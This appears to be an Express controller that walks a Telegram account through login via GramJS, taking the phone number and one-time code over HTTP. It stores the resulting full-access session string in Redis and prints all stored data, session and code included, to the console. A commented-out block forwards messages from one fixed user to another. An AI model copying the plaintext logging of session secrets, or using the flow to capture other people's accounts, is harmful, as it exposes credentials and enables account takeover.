const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const { makeRegisterKey } = require('../utils/helpers');
const { redis } = require('../models/redisModel');
const uuid = require('uuid');
const axios = require('axios');


const flows = {};

function createDeferred() {
  let resolve;
  const promise = new Promise((res) => { resolve = res; });
  return { promise, resolve };
}

async function initRegister(req, res) {
  const { apiId, apiHash } = req.body;
  if (!apiId || !apiHash) return res.status(400).json({ msg: '缺少参数' });

  const registerId = uuid.v4();
  await redis.hSet(makeRegisterKey(registerId), { apiId, apiHash, status: 'waitPhone',isRunning: 'false'});

  flows[registerId] = {
    phone: createDeferred(),
    code: createDeferred(),
    password: createDeferred(),
  };

  doRegisterFlow(registerId);
  res.json({ registerId });
}

async function submitPhone(req, res) {
  const { registerId, phone } = req.body;
  if (!registerId || !phone) return res.status(400).json({ msg: '缺少参数' });

  await redis.hSet(makeRegisterKey(registerId), { phone, status: 'waitCode',isRunning: 'false'});
  flows[registerId]?.phone?.resolve(phone);

  res.json({ msg: 'ok' });
}

async function submitCode(req, res) {
  const { registerId, code } = req.body;
  if (!registerId || !code) return res.status(400).json({ msg: '缺少参数' });

  await redis.hSet(makeRegisterKey(registerId), { code, status: 'verifying',isRunning: 'false'});
  flows[registerId]?.code?.resolve(code);

  res.json({ msg: 'ok' });
}

async function getStatus(req, res) {
  const { registerId } = req.query;
  if (!registerId) return res.status(400).json({ msg: '缺少参数' });

  const result = await redis.hGetAll(makeRegisterKey(registerId));
  res.json(result);
}

async function doRegisterFlow(registerId) {
  const data = await redis.hGetAll(makeRegisterKey(registerId));
  if (!data.apiId || !data.apiHash) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: '参数不全' });
    return;
  }

  try {
    const client = new TelegramClient(new StringSession(''), Number(data.apiId), data.apiHash, { connectionRetries: 5 });

    await client.start({
      phoneNumber: () => flows[registerId]?.phone?.promise,
      phoneCode: () => flows[registerId]?.code?.promise,
      password: () => '',
      onError: (err) => console.log('GramJS Error:', err),
    });

    const session = client.session.save();
    await redis.hSet(makeRegisterKey(registerId), { session, status: 'done', isRunning: 'true' });
    // 打印完整 Redis 存储内容
    const redisData = await redis.hGetAll(makeRegisterKey(registerId));
    console.log(`[REDIS STORED DATA]`, redisData);

    // client.addEventHandler(async (event) => {
    //   if (event.message.senderId?.valueOf() === 8088901247) {
    //     const msgText = event.message.text || "";
    //     const fromPeer = await event.message.getInputChat();
    //     console.log("收到来自 8088901247 的消息：", msgText);
    //
    //     await client.forwardMessages(7700169264, {
    //       messages: [event.message.id],
    //       fromPeer
    //     });
    //
    //     const reply = msgText.includes("123") ? "成功" : "失败";
    //     await client.sendMessage(7700169264, { message: reply });
    //   }
    // }, new NewMessage({}));
  } catch (e) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: e.message });
    console.error(`[FAIL] Register error: ${registerId}`, e);
  } finally {
    delete flows[registerId];
  }
}

module.exports = {
  initRegister,
  submitPhone,
  submitCode,
  getStatus
};
